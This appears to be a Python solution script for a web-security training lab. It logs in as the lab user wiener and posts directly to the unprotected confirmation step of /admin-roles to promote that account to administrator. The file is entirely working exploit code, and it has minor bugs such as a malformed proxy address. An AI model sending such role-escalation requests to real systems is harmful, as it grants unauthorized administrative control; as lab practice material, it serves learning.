import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://1270.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def self_promote(s, url):
    print("\n[+] Logging in as wiener")
    login_url = url + "/login"
    params = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "wiener" in r.text:
        print("[+] Logged-in! Trying now to self promote to admin")
        promote_url = url + "/admin-roles"
        params = {
            'action' : 'upgrade',
            'confirmed' : 'true',
            'username' : 'wiener'
        }
        r = s.post(promote_url, data=params, verify=False, proxies=proxies)
        if "wiener (ADMIN)" in r.text:
            print("[+] Exploit succeeded!")
            return
    else:
        print("[-] Error! Exiting the script!")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    print("\n[+] Lab: Multi-step process with no access control on one step")
    print("[+] The WebApp has an Access Control Vulnerability in the Admin Panel")
    print("[+] Administrators can upgrade or downgrade users' role and the process involves a 2-step confirmation process")
    print("[+] Controls are applied only during the first step which block attempts from unauthorized users")
    print("[+] Controls are not in place for the second step as anyone can send a post request and solf promote to admin role")

    self_promote(s, url)


if __name__ == "__main__":
    main()